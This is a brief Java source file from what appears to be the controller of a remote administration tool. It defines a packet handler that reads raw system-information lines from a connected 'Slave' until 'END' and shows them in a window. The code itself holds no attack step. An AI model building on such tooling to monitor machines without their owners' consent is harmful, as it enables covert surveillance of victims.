package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameRawSystemInfo;

public class PacketRAWINFO extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		FrameRawSystemInfo frame = FrameRawSystemInfo.instances.get(slave);
		
		while (!(line = slave.readLine()).equals("END")) {
			if (frame != null) {
				frame.append(line);
			}
		}
	}

}
